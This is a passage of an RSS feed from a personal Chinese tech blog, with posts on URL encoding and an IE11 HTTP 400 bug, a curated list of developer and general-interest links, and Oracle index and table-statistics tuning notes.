- https://www.openheart.icu/cs/%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7%E5%92%8C%E9%AB%98%E5%8F%AF%E9%9D%A0%E6%80%A7/ - ALL RIGHTS RESERVED KRIS NIE</description>
        </item>
    
    
    
        <item>
        <title>URL</title>
        <link>https://www.openheart.icu/cs/url/</link>
        <pubDate>Wed, 22 Jul 2020 20:28:00 +0000</pubDate>
        
        <guid>https://www.openheart.icu/cs/url/</guid>
        <description>42th openheart https://www.openheart.icu/cs/url/ -&lt;h1 id=&#34;url解析&#34;&gt;URL解析&lt;/h1&gt;
&lt;h2 id=&#34;urlencode&#34;&gt;UrlEncode&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;符号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;意义&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Encode&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;表示空格&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;%2B&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;(空格)&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;可以用+号替代&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;%20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;/&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;分隔目录和子目录&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;%2F&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;？&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;分隔实际的URL和参数&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;%3F&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;%&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;指定特殊字符&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;%25&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;#&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;表示书签&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;%23&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&amp;amp;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;URL 中指定的参数间的分隔符&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;%26&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;=&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;URL 中指定参数的值&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;%3D&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;ie11url解析问题&#34;&gt;IE11URL解析问题&lt;/h3&gt;
&lt;p&gt;今天(2020-8-3 14:41:03)，发现项目中使用IE11时打开连接出现&lt;code&gt;HTTP400&lt;/code&gt;的问题，有且仅在IE11里面，chrome正常。&lt;/p&gt;
&lt;p&gt;后来查资料发现，是因为我传参的时候带了中文字符，而IE对中文字符是有限制的，所以不成功，而要解决这个问题就需要转码，把要传的中文参数用UrlEncode方法给转一下码就ok。&lt;/p&gt;
- https://www.openheart.icu/cs/url/ - ALL RIGHTS RESERVED KRIS NIE</description>
        </item>
    
    
    
        <item>
        <title>Interesting</title>
        <link>https://www.openheart.icu/cs/interesting/</link>
        <pubDate>Wed, 22 Jul 2020 19:45:28 +0000</pubDate>
        
        <guid>https://www.openheart.icu/cs/interesting/</guid>
        <description>42th openheart https://www.openheart.icu/cs/interesting/ -&lt;h3 id=&#34;texturesjshttpsriccardoscalcoittextures&#34;&gt;&lt;a href=&#34;https://riccardoscalco.it/textures/&#34;&gt;Textures.js&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;一个 JS 纹理库，基于 D3.js&lt;/p&gt;
&lt;h3 id=&#34;elevatorjshttpsgithubcomtholmanelevatorjs&#34;&gt;&lt;a href=&#34;https://github.com/tholman/elevator.js&#34;&gt;elevator.js&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Finally, a &amp;ldquo;back to top&amp;rdquo; button that behaves like a real elevator, by adding elevator music to quietly soothe the awkwardness that can ensue when being smoothly scrolled to the top of the screen.&lt;/p&gt;
&lt;p&gt;This is very serious stuff, &lt;a href=&#34;http://tholman.com/elevator.js&#34;&gt;here&amp;rsquo;s a demo&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;一个使得“回到顶部”的网页滚动，具有电梯效果的 JS 库。&lt;/p&gt;
&lt;h3 id=&#34;mownedhttpsmownedcom&#34;&gt;&lt;a href=&#34;https://mowned.com/&#34;&gt;Mowned&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;一个手机数据库&lt;/p&gt;
&lt;h3 id=&#34;javascript-生成艺术图形教程httpsgenerativeartistrycomtutorials&#34;&gt;&lt;a href=&#34;https://generativeartistry.com/tutorials/&#34;&gt;JavaScript 生成艺术图形教程&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;介绍 如何使用JavaScript 生成8种艺术图形。&lt;/p&gt;
&lt;h3 id=&#34;使用-raspberry-pi-学习操作系统开发httpss-matyukevichgithubioraspberry-pi-os&#34;&gt;&lt;a href=&#34;https://s-matyukevich.github.io/raspberry-pi-os/&#34;&gt;使用 Raspberry Pi 学习操作系统开发&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;这是一个免费英文教程，教大家怎么用树莓派，一步步开发一个简单的操作系统内核，每一步都有实例代码&lt;/p&gt;
&lt;h3 id=&#34;vim-的由来httpspragmaticpineapplecomhow-did-vim-become-so-popular&#34;&gt;&lt;a href=&#34;https://pragmaticpineapple.com/how-did-vim-become-so-popular/&#34;&gt;Vim 的由来&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Vim 有30多年历史，目前依然是最流行的编辑器之一。本文简要地回顾了历史，它的一些主要的设计决定，到底是怎么来的&lt;/p&gt;
&lt;h3 id=&#34;makefile-的静态网站实现httpsmetinnextcorgpoststhe_idea_of_makefile_bloghtml&#34;&gt;&lt;a href=&#34;https://metin.nextc.org/posts/The_Idea_Of_Makefile_Blog.html&#34;&gt;Makefile 的静态网站实现&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;现在有各种各样的静态网站工具，比如 Jekyll 和 Hugo 等。作者提出，Makefile 也可以用来实现静态网站，这样就不需要任何外部工具了，只维护一个 Makefile 配置文件即可&lt;/p&gt;
&lt;h3 id=&#34;字体反爬的攻与防httpscjtingme20200701douyu-crawler-and-font-anti-crawling&#34;&gt;&lt;a href=&#34;https://cjting.me/2020/07/01/douyu-crawler-and-font-anti-crawling/&#34;&gt;字体反爬的攻与防&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;作者因为业务原因需要爬取一批斗鱼主播的相关数据，结果发现斗鱼使用了一种很有意思的反爬技术：字体反爬&lt;/p&gt;
&lt;h3 id=&#34;分页查询不要使用-offset-和-limit-语法httpshackernooncomplease-dont-use-offset-and-limit-for-your-pagination-8ux3u4y&#34;&gt;&lt;a href=&#34;https://hackernoon.com/please-dont-use-offset-and-limit-for-your-pagination-8ux3u4y&#34;&gt;分页查询不要使用 OFFSET 和 LIMIT 语法&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;数据查询时，如果数据多，就需要分页，一般使用 OFFSET 和 LIMIT 语法。这篇文章提出，这样做不好，耗费资源，有性能问题&lt;/p&gt;
&lt;h3 id=&#34;git-多行提交信息的简单方法httpswwwstefanjudiscomtoday-i-learnedgit-commit-accepts-several-message-flags-m-to-allow-multiline-commits&#34;&gt;&lt;a href=&#34;https://www.stefanjudis.com/today-i-learned/git-commit-accepts-several-message-flags-m-to-allow-multiline-commits/&#34;&gt;Git 多行提交信息的简单方法&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;git commit&lt;/code&gt;命令的&lt;code&gt;-m&lt;/code&gt;参数用来指定提交信息，但是这样提交的信息只有一行。本文介绍实现多行信息的简单方法&lt;/p&gt;
&lt;p&gt;eg:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;git co -m &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;commit title&amp;#34;&lt;/span&gt; -m &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;commit description&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;盲文的由来httpsstitcherioblogbraille-and-the-history-of-software&#34;&gt;&lt;a href=&#34;https://stitcher.io/blog/braille-and-the-history-of-software&#34;&gt;盲文的由来&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;如题&lt;/p&gt;
&lt;h3 id=&#34;漫长的雨httpwwwsamwellernetbradbury-120181129the-essential-bradbury&#34;&gt;&lt;a href=&#34;http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury&#34;&gt;漫长的雨&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;《漫长的雨》（The long rain，&lt;strong&gt;&lt;a href=&#34;https://www.sohu.com/a/337866552_771944&#34;&gt;中译全文&lt;/a&gt;&lt;/strong&gt;）是美国科幻小说作家雷·布拉德伯里（Ray Bradbury）1950年发表的一篇短篇小说。&lt;/p&gt;
&lt;p&gt;它讲述四个宇航员因为火箭失事，来到一个不停下雨的星球。这个星球永远在下瓢泼大雨，过去10年一秒都没有停过。宇航员冒着雨水，在丛林里面穿行，拼命寻找前人修建的“阳光穹顶”，那里是一个大屋顶，有温暖的人造阳光，以及充足的食物和休息的场所。&lt;/p&gt;
&lt;p&gt;小说的开头是这样的：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;大雨，永远的雨，升腾着汗水和蒸汽的雨。这是密集的瓢泼大雨，像鞭子一样打在眼睛上，飞溅到脚踝上。它是一场淹没其他所有雨水的雨，让人遗忘所有关于雨水的记忆。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;6个最常见的网页可访问性问题httpsblogscottlogiccom202007026-most-common-accessibility-problemshtmlempty-links-and-empty-buttons&#34;&gt;&lt;a href=&#34;https://blog.scottlogic.com/2020/07/02/6-most-common-accessibility-problems.html#empty-links-and-empty-buttons&#34;&gt;6个最常见的网页可访问性问题&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;可访问性（accessibility）指的是，网页对生理缺陷的用户是否友好。本文总结了6个最常见的可访问性问题及其解决方法&lt;/p&gt;
&lt;h3 id=&#34;伪随机数生成器httpsgithubcombryccodeblobmasterjshashprngsmd&#34;&gt;&lt;a href=&#34;https://github.com/bryc/code/blob/master/jshash/PRNGs.md&#34;&gt;伪随机数生成器&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;伪随机数指的是通过一种算法，由种子值得到的随机数。本文介绍了几种简单的伪随机数算法&lt;/p&gt;
&lt;h3 id=&#34;75行代码入门-webglhttpsavikdascom20200708barebones-webgl-in-75-lines-of-codehtml&#34;&gt;&lt;a href=&#34;https://avikdas.com/2020/07/08/barebones-webgl-in-75-lines-of-code.html&#34;&gt;75行代码入门 WebGL&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;WebGL 是浏览器对 OpenGL API 的调用接口，可以在浏览器里面实现 3D 动画。本文用一个简短的例子，介绍了这个 API。这只是一篇简介，另有&lt;a href=&#34;https://www.toptal.com/javascript/3d-graphics-a-webgl-tutorial&#34;&gt;完整的 WebGL 教程&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;redisearchhttpsossredislabscomredisearch&#34;&gt;&lt;a href=&#34;https://oss.redislabs.com/redisearch/&#34;&gt;RediSearch&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;以 Redis 作为后端的全文搜索引擎，支持中文&lt;/p&gt;
&lt;h3 id=&#34;onelook-thesaurushttpswwwonelookcomthesaurus&#34;&gt;&lt;a href=&#34;https://www.onelook.com/thesaurus/&#34;&gt;OneLook Thesaurus&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;英语的同义词词典，可以查询同义词，也可以根据描述返回对应的词（比如 &lt;a href=&#34;https://www.onelook.com/thesaurus/?s=large%20birds&amp;amp;loc=revfp&#34;&gt;large bird&lt;/a&gt; 对应哪些词），加载速度很快&lt;/p&gt;
&lt;h3 id=&#34;crdttechhttpscrdttech&#34;&gt;&lt;a href=&#34;https://crdt.tech/&#34;&gt;CRDT.tech&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;CRDT 是一种数据结构，用于分布式网络的数据同步，最典型的例子就是多人同时编辑文档。该网站收集了 CRDT 的相关资料&lt;/p&gt;
&lt;h3 id=&#34;progressive-app-storehttpsprogressiveappstorehome&#34;&gt;&lt;a href=&#34;https://progressiveapp.store/home&#34;&gt;Progressive App Store&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;一个渐进式 App 的在线商店，收集各种 Progessive App，是网友搭建的&lt;/p&gt;
&lt;h3 id=&#34;网页设计博物馆httpswwwwebdesignmuseumorg&#34;&gt;&lt;a href=&#34;https://www.webdesignmuseum.org/&#34;&gt;网页设计博物馆&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;该网站收集了1600多个经过精心挑选和分类的网页，展示了1991年至2006年之间的网站设计趋势&lt;/p&gt;
&lt;h3 id=&#34;窗口交换httpswindow-swapcom&#34;&gt;&lt;a href=&#34;https://window-swap.com/&#34;&gt;窗口交换&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;该网站让世界各地的人上传他们窗外的镜像，一段5到10分钟的视频。其他用户就可以在网站上随机看到别人的窗外&lt;/p&gt;
&lt;h3 id=&#34;cnetcomhttpswwwcnetcompicturesinside-the-kansas-survival-condo-designed-to-save-you-from-nuclear-winter&#34;&gt;&lt;a href=&#34;https://www.cnet.com/pictures/inside-the-kansas-survival-condo-designed-to-save-you-from-nuclear-winter/&#34;&gt;cnet.com&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;幸存者公寓&lt;/p&gt;
&lt;h3 id=&#34;平流层飞船httpswwwgeekwirecom2020space-perspective-reboots-vision-flying-passengers-stratosphere-balloon&#34;&gt;&lt;a href=&#34;https://www.geekwire.com/2020/space-perspective-reboots-vision-flying-passengers-stratosphere-balloon/&#34;&gt;平流层飞船&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;美国一家私人公司提出了“平流层飞船”计划，让游客乘坐飞船上升到平流层（距离地面30公里），体验一下太空的感觉，票价预计为每人12.5万美元。飞船可以乘坐八名乘客和一名飞行员，先进行长达两个小时的上升，然后在空中停留两个小时，最后再花两个小时下降。&lt;/p&gt;
&lt;p&gt;飞船的上升动力，主要来自一个巨大的充满氢气的气球。飞船内部有酒吧，还有一个“拥有世界上最佳视野”的厕所，甚至有 Wifi。该公司计划飞船在2024年完工，目前已经在&lt;a href=&#34;https://thespaceperspective.com/fly/&#34;&gt;官网&lt;/a&gt;接受预订。&lt;/p&gt;
&lt;h3 id=&#34;sha-256-的原理httpsqvaultio20200708how-sha-2-works-step-by-step-sha-256&#34;&gt;&lt;a href=&#34;https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/&#34;&gt;SHA-256 的原理&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;本文通过一个简单的例子，一步步演示 SHA-256 算法，如何将字符串变成一个256位的哈希值。&lt;/p&gt;
&lt;h3 id=&#34;javascript-函数作用域解释httpsbloggreenrootsinfojavascript-scope-fundamentals-with-tom-and-jerry-ckcq723h4007vkxs18dxa97ae&#34;&gt;&lt;a href=&#34;https://blog.greenroots.info/javascript-scope-fundamentals-with-tom-and-jerry-ckcq723h4007vkxs18dxa97ae&#34;&gt;JavaScript 函数作用域解释&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;通过一个简单的例子，解释 JavaScript 的函数作用域规则&lt;/p&gt;
&lt;h3 id=&#34;gpt-3-模型的图灵测试httplackerioai20200706giving-gpt-3-a-turing-testhtml&#34;&gt;&lt;a href=&#34;http://lacker.io/ai/2020/07/06/giving-gpt-3-a-turing-test.html&#34;&gt;GPT-3 模型的图灵测试&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;GPT-3 是 OpenAI 公司开发的一个 AI 模型，能够自动生成文本。作者对它进行了图灵测试，跟它对话，看能不能分辨出对方是一个软件。&lt;/p&gt;
&lt;h3 id=&#34;pastemecnhttpspastemecn&#34;&gt;&lt;a href=&#34;https://pasteme.cn/&#34;&gt;PasteMe.cn&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;一个文本分享网站，不需要注册，会对输入的文本或代码生成 URL，支持密码和阅后即焚&lt;/p&gt;
&lt;h3 id=&#34;shoelacehttpsshoelacestyle&#34;&gt;&lt;a href=&#34;https://shoelace.style/&#34;&gt;Shoelace&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;一个 Web Components 组件库，易用&lt;/p&gt;
&lt;h3 id=&#34;3d-封面生成器https3d-book-cssnetlifyapp&#34;&gt;&lt;a href=&#34;https://3d-book-css.netlify.app/&#34;&gt;3D 封面生成器&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;在线工具，让一张平面图片变成 3D 书籍封面。&lt;/p&gt;
&lt;h3 id=&#34;easy-monitorhttpsgithubcomhyj1991easy-monitor&#34;&gt;&lt;a href=&#34;https://github.com/hyj1991/easy-monitor&#34;&gt;easy-monitor&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Node.js 应用的性能监控工具，可以定位线上故障。代码开源，支持私有部署&lt;/p&gt;
&lt;h3 id=&#34;remark42httpsgithubcomumputunremark42&#34;&gt;&lt;a href=&#34;https://github.com/umputun/remark42&#34;&gt;remark42&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;开源的评论服务，可以用来为静态网页加上留言功能。&lt;/p&gt;
&lt;h3 id=&#34;wikijshttpswikijsorg&#34;&gt;&lt;a href=&#34;https://wiki.js.org/&#34;&gt;Wiki.js&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;架设个人 Wiki 的 Node.js 应用。&lt;/p&gt;
&lt;h3 id=&#34;rust-语言之旅httpstourofrustcom00_zh-cnhtml&#34;&gt;&lt;a href=&#34;https://tourofrust.com/00_zh-cn.html&#34;&gt;Rust 语言之旅&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Rust 语言的中文版在线教程，通过可以运行的小例子介绍语法，从 Hello World 开始讲起&lt;/p&gt;
&lt;h3 id=&#34;木星相册httpswwwflickrcomphotoskevinmgillalbums72157709069900506&#34;&gt;&lt;a href=&#34;https://www.flickr.com/photos/kevinmgill/albums/72157709069900506&#34;&gt;木星相册&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;一个天文爱好者收集的木星照片。&lt;/p&gt;
&lt;h3 id=&#34;麻省理工学院的统计学课件httpsocwmiteducoursesmathematics18-650-statistics-for-applications-fall-2016lecture-slides&#34;&gt;&lt;a href=&#34;https://ocw.mit.edu/courses/mathematics/18-650-statistics-for-applications-fall-2016/lecture-slides/&#34;&gt;麻省理工学院的统计学课件&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;麻省理工学院本科生统计学课程的 PPT 课件&lt;/p&gt;
&lt;h3 id=&#34;没有博士学位者的-tensorflow-和深度学习教程httpscodelabsdevelopersgooglecomcodelabscloud-tensorflow-mnist&#34;&gt;&lt;a href=&#34;https://codelabs.developers.google.com/codelabs/cloud-tensorflow-mnist/&#34;&gt;没有博士学位者的 TensorFlow 和深度学习教程&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;谷歌发布的英文教程，没有高深的数学，向初学者介绍 TensorFlow 和深度学习。&lt;/p&gt;
&lt;h3 id=&#34;javascript-的第三纪元httpswwwswyxiowritingjs-third-age&#34;&gt;&lt;a href=&#34;https://www.swyx.io/writing/js-third-age/&#34;&gt;JavaScript 的第三纪元&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;作者认为，JavaScript 的发展可以分成三个阶段：原始阶段、Node.js 阶段和目前的超越阶段。&lt;/p&gt;
&lt;p&gt;当前阶段的主要特征是，JavaScript 开始作为底层技术，ES6 模块、TypeScript、WebAssembly 逐渐普及&lt;/p&gt;
&lt;h3 id=&#34;如何构建优秀的-apihttpswwwstxnextcombloghow-to-build-a-good-api-that-wont-embarrass-you&#34;&gt;&lt;a href=&#34;https://www.stxnext.com/blog/how-to-build-a-good-api-that-wont-embarrass-you&#34;&gt;如何构建优秀的 API&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;本文介绍设计一个优秀的 RESTful API 的注意事项，以及 REST 和 GraphQL 两种 API 的差异&lt;/p&gt;
&lt;h3 id=&#34;python-的-sqlite-数据库教程httpstowardsdatasciencecomdo-you-know-python-has-a-built-in-database-d553989c87bd&#34;&gt;&lt;a href=&#34;https://towardsdatascience.com/do-you-know-python-has-a-built-in-database-d553989c87bd&#34;&gt;Python 的 SQLite 数据库教程&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;本文是入门教程，介绍如何在 Python 语言使用内置的 SQLite 数据库，不需要任何安装步骤&lt;/p&gt;
&lt;h3 id=&#34;10个有用的-git-log-技巧httpshackernooncomten-useful-git-log-tricks-7nt3yxy&#34;&gt;&lt;a href=&#34;https://hackernoon.com/ten-useful-git-log-tricks-7nt3yxy&#34;&gt;10个有用的 git log 技巧&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;本文介绍&lt;code&gt;git log&lt;/code&gt;命令的10个参数用法&lt;/p&gt;
&lt;h3 id=&#34;async-函数的一个注意点httpswwwbrandonsmithninjablogasync-await&#34;&gt;&lt;a href=&#34;https://www.brandonsmith.ninja/blog/async-await&#34;&gt;async 函数的一个注意点&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;本文提醒大家注意，使用 JavaScript 的 async/await 函数时，要区分并发操作和继发操作&lt;/p&gt;
&lt;h3 id=&#34;react-spectrumhttpsreact-spectrumadobecomreact-spectrumindexhtml&#34;&gt;&lt;a href=&#34;https://react-spectrum.adobe.com/react-spectrum/index.html&#34;&gt;React Spectrum&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Adobe 公司的 React 组件库&lt;/p&gt;
&lt;h3 id=&#34;css-sweeperhttpsgithubcompropjockeycss-sweeper&#34;&gt;&lt;a href=&#34;https://github.com/propjockey/css-sweeper&#34;&gt;css-sweeper&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;一个只用 HTML 和 CSS 实现的扫雷游戏，不使用 JavaScript&lt;/p&gt;
&lt;h3 id=&#34;react-tablehttpsgithubcomtannerlinsleyreact-table&#34;&gt;&lt;a href=&#34;https://github.com/tannerlinsley/react-table&#34;&gt;react-table&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;React 的表格组件库，新的 7.0 版完全采用 Hooks 设计&lt;/p&gt;
&lt;h3 id=&#34;数据可视化图表目录httpsdatavizcataloguecomzh&#34;&gt;&lt;a href=&#34;https://datavizcatalogue.com/ZH/&#34;&gt;数据可视化图表目录&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;这个网站收集各种数据可视化的图表类型，简要讲解每种类型的用途和特点&lt;/p&gt;
&lt;h3 id=&#34;拥抱扩展扑灭httpsenwikipediaorgwikiembrace_extend_and_extinguish&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Embrace,_extend,_and_extinguish&#34;&gt;拥抱，扩展，扑灭&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;1996年，美国司法部发现，微软公司内部使用“拥抱，扩展，扑灭”（Embrace, extend, and extinguish，简称 EEE ）这个短语，描述对付竞争对手的策略。&lt;/p&gt;
&lt;p&gt;首先，拥抱对方的产品种类，进入对方的市场；然后，使用自己的专有功能扩展产品标准；最后，利用这些差异，使竞争对手处于不利地位。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;拥抱阶段&lt;/strong&gt; ：开发与竞争产品基本兼容的软件，或实施公共标准。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;扩展阶段&lt;/strong&gt;：添加和推广竞争对手或标准不支持的功能。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;扑灭阶段&lt;/strong&gt;：由于市场份额的扩展，添加的功能成为事实上的标准时，再将竞争对手边缘化。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;微软的 IE 浏览器就是使用这种策略的最好例子。&lt;/p&gt;
&lt;p&gt;现在有人认为，微软对于开源软件的态度，从敌对变成拥抱，也有可能是在实施这种策略。另一方面，谷歌公司在很多技术领域的作为，也让人疑虑，它在实施这种策略。&lt;/p&gt;
- https://www.openheart.icu/cs/interesting/ - ALL RIGHTS RESERVED KRIS NIE</description>
        </item>
    
    
    
        <item>
        <title>Oracle</title>
        <link>https://www.openheart.icu/cs/oracle/</link>
        <pubDate>Tue, 21 Jul 2020 20:28:00 +0000</pubDate>
        
        <guid>https://www.openheart.icu/cs/oracle/</guid>
        <description>42th openheart https://www.openheart.icu/cs/oracle/ -&lt;h1 id=&#34;common-operation&#34;&gt;Common Operation&lt;/h1&gt;
&lt;h2 id=&#34;删除操作前一定要先执行一遍查询&#34;&gt;删除操作前一定要先执行一遍查询&lt;/h2&gt;
&lt;p&gt;如题， 带的一个新员工做补丁把项目历史数据干掉了 My bad.&lt;/p&gt;
&lt;p&gt;2020-8-7&lt;/p&gt;
&lt;h1 id=&#34;optimize&#34;&gt;Optimize&lt;/h1&gt;
&lt;h2 id=&#34;索引失效&#34;&gt;索引失效&lt;/h2&gt;
&lt;p&gt;SQL在&lt;code&gt;WHERE&lt;/code&gt;条件里面使用了&lt;code&gt;IN&lt;/code&gt;导致有一个关联表的索引失效，Oracle版本为11g&lt;/p&gt;
&lt;p&gt;条件中有or，要想使用or，又想让索引生效，只能将or条件中的每个列都加上索引&lt;/p&gt;
&lt;p&gt;like查询是以%开头&lt;/p&gt;
&lt;p&gt;如果列类型是字符串，那一定要在条件中将数据使用引号引用起来,否则不使用索引&lt;/p&gt;
&lt;h2 id=&#34;分库-分表-分区&#34;&gt;分库 分表 分区&lt;/h2&gt;
&lt;h2 id=&#34;视图优化&#34;&gt;视图优化&lt;/h2&gt;
&lt;h3 id=&#34;基表增加索引&#34;&gt;基表增加索引&lt;/h3&gt;
&lt;p&gt;对基表中，视图查询SQL的&lt;code&gt;WHERE&lt;/code&gt;条件中用到的字段增加索引&lt;/p&gt;
&lt;h3 id=&#34;重新进行表分析&#34;&gt;重新进行表分析&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;-- 视图查询慢
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;analyze&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table_name&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;delete&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;statistics&lt;/span&gt;;
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;analyze&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table_name&lt;/span&gt; compute &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;statistics&lt;/span&gt;;

&lt;span style=&#34;color:#228b22&#34;&gt;-- 在当前用户下执行
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;analyze table &amp;#39;&lt;/span&gt;||&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table_name&lt;/span&gt;||&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39; compute statistics;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;from&lt;/span&gt; user_tables &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table_name&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;IN&lt;/span&gt; (&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;tablename&amp;#39;&lt;/span&gt;);   

&lt;span style=&#34;color:#228b22&#34;&gt;-- 得到如下语句，将这些语句整体执行一遍
